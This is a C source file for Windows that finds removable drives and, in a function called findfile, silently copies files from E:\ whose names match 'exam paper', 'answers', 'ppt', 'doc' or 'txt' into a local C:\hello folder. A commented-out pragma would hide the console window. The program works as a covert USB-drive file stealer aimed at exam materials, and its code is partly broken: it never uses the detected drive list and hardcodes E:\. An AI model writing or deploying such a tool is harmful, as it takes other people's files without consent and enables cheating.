#define _CRT_SECURE_NO_WARNINGS
//#ifdef _MSC_VER
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
//#endif

#include <stdio.h>
#include<io.h>
#include <Windows.h>
#include "dirent.h"
int getDirName(TCHAR diskName[26][10]);
//获取所有可移动硬盘的名称，返回可移动硬盘的个数
int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10], int diskNumber);
void convertsCharToTCHAR(char* strUsr, TCHAR* Name);
void findfile(TCHAR* dirName);

int main()
{
	TCHAR diskName[26][10] = { 0 };
	TCHAR removebleDiskName[26][10] = { 0 };
	int diskNumber = 0;
	int removebleNumber = 0;
	diskNumber=getDirName(diskName);
	removebleNumber = getAllDirRemoveble(diskName, removebleDiskName, diskNumber);
	if (!removebleNumber)
	{
		 
	}
	findfile(TEXT("E:\\"));
	return 0;
}

int getDirName(TCHAR diskName[26][10])
{
	TCHAR wDrivesName[256];
	GetLogicalDriveStrings(256, wDrivesName);
	TCHAR* p = wDrivesName;
	int i = 0;
	for (i=0; i < 26 && *p != 0; i++)
	{
		wsprintf(diskName[i], TEXT("%s"), p);
		p += (lstrlen(p) + 1);
	}
	return i;
}

int getAllDirRemoveble(TCHAR diskName[26][10], TCHAR removebleDiskName[26][10],int diskNumber)
{
	int removebleDiskNumber = 0;
	for (int i = 0; i < diskNumber; i++)
	{
		if (GetDriveType(diskName[i]) == DRIVE_REMOVABLE)
		{
			wsprintf(removebleDiskName[removebleDiskNumber], TEXT("%s"), diskName[i]);
			removebleDiskNumber++;
		}
	}
	return removebleDiskNumber;
}

void convertsCharToTCHAR(char *strUsr,TCHAR *Name)
{
#ifdef UNICODE
	MultiByteToWideChar(CP_ACP, 0, strUsr, -1, Name, 100);
#else
	strcpy(Name, strUsr);
#endif
}
void findfile(TCHAR* dirName)
{
	TCHAR fileName[260] = { 0 };
	TCHAR fileNameAll[300] = { 0 };
	TCHAR copyFileName[260] = { 0 };
	intptr_t file;
	struct _finddata_t find;


	_chdir(dirName);
	if ((file = _findfirst("*.*", &find)) == -1L)
	{
		return;
	}

		convertsCharToTCHAR(find.name, fileName);

		if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT("ppt")) != NULL || strstr(fileName, TEXT("doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT("txt")) != NULL)
		{
			printf("%s\n", fileName);
			wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
			wsprintf(copyFileName, TEXT("C:\\hello\\%s"), fileName);

			if (CopyFile(fileNameAll, copyFileName, FALSE) != 0)
			{
				printf("TURE\n");
			}
		}

	while (_findnext(file, &find) == 0)
	{
		if (strcmp(find.name, ".") == 0 || strcmp(find.name, "..") == 0)
					continue;
			convertsCharToTCHAR(find.name, fileName);

			if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT("ppt")) != NULL || strstr(fileName, TEXT("doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT("txt")) != NULL)
			{
				printf("%s\n", fileName);
				wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
				wsprintf(copyFileName, TEXT("C:\\hello\\%s"), fileName);
				Sleep(1);
				if (CopyFile(fileNameAll, copyFileName, FALSE) != 0)
				{
					printf("TURE\n");
				}
			}
		
	}
	_findclose(file);

	return;
}